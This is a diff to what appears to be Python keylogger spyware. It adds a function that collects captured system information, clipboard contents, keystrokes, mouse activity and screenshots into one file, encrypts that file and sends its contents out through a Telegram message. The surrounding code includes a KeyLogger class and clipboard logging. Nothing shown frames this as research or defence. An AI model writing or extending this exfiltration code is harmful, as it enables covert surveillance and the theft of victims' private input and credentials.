@@ -137,6 +137,24 @@ def log_clipboard(file_name, key):
     except Exception as e:
         print(f"Error logging clipboard data: {e}")
 
+def aggregate_data(key):
+    try:
+        with open(file_path + extend + 'aggregated_info.txt', 'w') as f:
+            for filename in [system_information, clipboard_information, keys_information, mouse_information, screenshot_information]:
+                f.write('\n----- ' + filename + ' -----\n')
+                with open(file_path + extend + filename, 'r') as infile:
+                    f.write(infile.read())
+                    f.write('\n\n')
+        encrypt_file(file_path + extend + 'aggregated_info.txt', key)
+
+        # Sending message via Telegram
+        with open(file_path + extend + 'aggregated_info.txt', 'r') as file:
+            message_content = file.read()
+        send_telegram_message(message_content)
+
+    except Exception as e:
+        print(f"Error in aggregate_data: {e}")
+
 class KeyLogger:
     def __init__(self, log_file, key):
         self.log_file = log_file
